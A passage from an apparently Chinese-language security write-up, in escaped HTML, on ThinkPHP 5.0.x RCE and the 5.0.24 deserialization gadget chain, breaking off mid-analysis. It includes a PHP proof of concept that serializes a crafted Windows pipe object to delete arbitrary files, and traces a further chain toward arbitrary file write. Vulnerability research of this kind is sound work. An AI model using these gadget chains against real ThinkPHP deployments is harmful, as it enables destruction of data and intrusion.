&lt;p&gt;在App::run()方法里面，如果我们开启了debug模式，则会调用Request::param()方法：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210312150633.png&#34; alt=&#34;image-20210309112057671&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;当然，即使没有开启debug，在App::run()里面的调用的exec方法同样也会调用Request::param()方法&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210312150643.png&#34; alt=&#34;image-20210309115557269&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;因为调用栈太深，就不一个个跟了&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210312150651.png&#34; alt=&#34;image-20210309115705097&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;这个方法我们需要特别关注了，因为 &lt;strong&gt;Request&lt;/strong&gt; 类中的 &lt;code&gt;param、route、get、post、put、delete、patch、request、session、server、env、cookie、input&lt;/code&gt; 方法均调用了 &lt;strong&gt;filterValue&lt;/strong&gt; 方法，而该方法中就存在可利用的 &lt;strong&gt;call_user_func&lt;/strong&gt; 函数&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210312150703.png&#34; alt=&#34;image-20210309113026498&#34;  /&gt;&lt;/p&gt;
&lt;h3 id=&#34;小结&#34;&gt;小结&lt;/h3&gt;
&lt;p&gt;不同的payload触发流程不一样，但是核心是一样的。&lt;/p&gt;
&lt;p&gt;任意方法调用发生在method()，变量覆盖发生在__construct()，rce发生在filterValue()&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210312150713.png&#34; alt=&#34;&#34;  /&gt;&lt;/p&gt;
&lt;h2 id=&#34;5024反序列化利用链&#34;&gt;5.0.24反序列化利用链&lt;/h2&gt;
&lt;p&gt;反序列化复现首先需要自己构造一个反序列化触发点：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210417135956.png&#34; alt=&#34;image-20210417135947010&#34;  /&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;### Windows类-任意文件删除
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;在thinkphp/library/think/process/pipes/Windows.php:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;k&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;nc&#34;&gt;Windows&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;extends&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;Pipes&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;private&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$files&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[];&lt;/span&gt;
    &lt;span class=&#34;nx&#34;&gt;……&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;private&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;removeFiles&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
    &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
        &lt;span class=&#34;k&#34;&gt;foreach&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;files&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;as&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$filename&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
            &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;file_exists&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$filename&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
                &lt;span class=&#34;o&#34;&gt;@&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;unlink&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$filename&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
            &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
        &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
        &lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;files&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[];&lt;/span&gt;
    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
    &lt;span class=&#34;nx&#34;&gt;……&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;fm&#34;&gt;__destruct&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
    &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
        &lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;close&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;
        &lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;removeFiles&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;
    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;   
&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;由于&lt;code&gt;$this-&amp;gt;files&lt;/code&gt;可控，我们可以利用其实现任意文件删除&lt;/p&gt;
&lt;p&gt;poc：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;php&lt;/span&gt;
&lt;span class=&#34;k&#34;&gt;namespace&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;think\process\pipes&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;

&lt;span class=&#34;k&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;nc&#34;&gt;Pipes&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;

&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;

&lt;span class=&#34;k&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;nc&#34;&gt;Windows&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;extends&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;Pipes&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;private&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$files&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[];&lt;/span&gt;

    &lt;span class=&#34;k&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;fm&#34;&gt;__construct&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
    &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
        &lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;files&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;D:\tmp\1.txt&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;
    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;

&lt;span class=&#34;k&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;base64_encode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;serialize&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;Windows&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()));&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;只需要一个反序列化触发点，就可以实现任意文件删除。&lt;/p&gt;
&lt;h3 id=&#34;output类__call方法任意文件写&#34;&gt;Output类&lt;code&gt;__call&lt;/code&gt;方法任意文件写&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;Thinkphp 5.0.x反序列化最后触发RCE，本来要调用的&lt;code&gt;Request&lt;/code&gt;类&lt;code&gt;__call&lt;/code&gt;方法.&lt;/p&gt;
&lt;p&gt;参考：&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://xz.aliyun.com/t/8143#toc-10&#34;&gt;https://xz.aliyun.com/t/8143#toc-10&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.anquanke.com/post/id/196364#h2-2&#34;&gt;https://www.anquanke.com/post/id/196364#h2-2&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;http://althims.com/2020/02/07/thinkphp-5-0-24-unserialize/&#34;&gt;http://althims.com/2020/02/07/thinkphp-5-0-24-unserialize/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.anquanke.com/post/id/219327&#34;&gt;https://www.anquanke.com/post/id/219327&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;还是从Windows类的&lt;code&gt;__destruct&lt;/code&gt;入手&lt;/p&gt;
&lt;p&gt;在上述Windows类的&lt;code&gt;removeFiles()&lt;/code&gt;中使用了&lt;code&gt;file_exists()&lt;/code&gt;函数，这个函数会把&lt;code&gt;$filename&lt;/code&gt;当作字符串处理&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210417144045.png&#34; alt=&#34;image-20210417144037447&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;利用这一点，我们可以传入一个对象来触发&lt;code&gt;__toString&lt;/code&gt;方法，于是全局搜索&lt;code&gt;__toString&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210417202754.png&#34; alt=&#34;image-20210417194627181&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;可以看到他调用了&lt;code&gt;toJson&lt;/code&gt;方法，因为&lt;code&gt;class Model&lt;/code&gt;是一个抽象类，不能直接调用，所以我们目光移到子类里面&lt;/p&gt;
&lt;p&gt;可以通过thinkphp/library/think/model/Pivot.php这个里面的类进行调用&lt;/p&gt;
&lt;p&gt;跟进&lt;code&gt;toJson&lt;/code&gt;方法：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;k&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;nc&#34;&gt;Model&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
    &lt;span class=&#34;nx&#34;&gt;……&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;toJson&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$options&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;JSON_UNESCAPED_UNICODE&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
    &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
        &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;json_encode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;toArray&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(),&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$options&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
    &lt;span class=&#34;nx&#34;&gt;……&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;调用了&lt;code&gt;$this-&amp;gt;toArray&lt;/code&gt;，跟进&lt;code&gt;toArray&lt;/code&gt;方法：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;k&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;nc&#34;&gt;Model&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
    &lt;span class=&#34;nx&#34;&gt;……&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;toArray&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
    &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
        &lt;span class=&#34;nv&#34;&gt;$item&lt;/span&gt;    &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[];&lt;/span&gt;
        &lt;span class=&#34;nv&#34;&gt;$visible&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[];&lt;/span&gt;
        &lt;span class=&#34;nv&#34;&gt;$hidden&lt;/span&gt;  &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[];&lt;/span&gt;

        &lt;span class=&#34;nv&#34;&gt;$data&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;array_merge&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;data&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;relation&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;

        &lt;span class=&#34;c1&#34;&gt;// 过滤属性
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;        &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;empty&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;visible&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
            &lt;span class=&#34;nv&#34;&gt;$array&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;parseAttr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;visible&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$visible&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
            &lt;span class=&#34;nv&#34;&gt;$data&lt;/span&gt;  &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;array_intersect_key&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$data&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;array_flip&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$array&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;));&lt;/span&gt;
        &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;elseif&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;empty&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;hidden&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
            &lt;span class=&#34;nv&#34;&gt;$array&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;parseAttr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;hidden&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$hidden&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;false&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
            &lt;span class=&#34;nv&#34;&gt;$data&lt;/span&gt;  &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;array_diff_key&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$data&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;array_flip&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$array&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;));&lt;/span&gt;
        &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;

        &lt;span class=&#34;k&#34;&gt;foreach&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$data&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;as&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$key&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$val&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
            &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$val&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;instanceof&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;Model&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;||&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$val&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;instanceof&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;ModelCollection&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
                &lt;span class=&#34;c1&#34;&gt;// 关联模型对象
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;                &lt;span class=&#34;nv&#34;&gt;$item&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$key&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;subToArray&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$val&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$visible&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$hidden&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$key&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
            &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;elseif&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;is_array&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$val&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;reset&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$val&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;instanceof&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;Model&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
                &lt;span class=&#34;c1&#34;&gt;// 关联模型数据集
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;                &lt;span class=&#34;nv&#34;&gt;$arr&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[];&lt;/span&gt;
                &lt;span class=&#34;k&#34;&gt;foreach&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$val&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;as&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$k&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$value&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
                    &lt;span class=&#34;nv&#34;&gt;$arr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$k&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;subToArray&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$value&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$visible&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$hidden&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$key&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
                &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
                &lt;span class=&#34;nv&#34;&gt;$item&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$key&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$arr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
            &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
                &lt;span class=&#34;c1&#34;&gt;// 模型属性
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;                &lt;span class=&#34;nv&#34;&gt;$item&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$key&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getAttr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$key&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
            &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
        &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
    &lt;span class=&#34;nx&#34;&gt;……&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;因为最终要触发&lt;code&gt;__call&lt;/code&gt;，我们需要找到函数调用的地方，在toArray里面有这几处：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210417211525.png&#34; alt=&#34;image-20210417202816283&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;经过调试过后选择最后一处&lt;code&gt;$item[$key] = $value ? $value-&amp;gt;getAttr($attr) : null&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;要进入到这一处要满足的条件是：&lt;/p&gt;
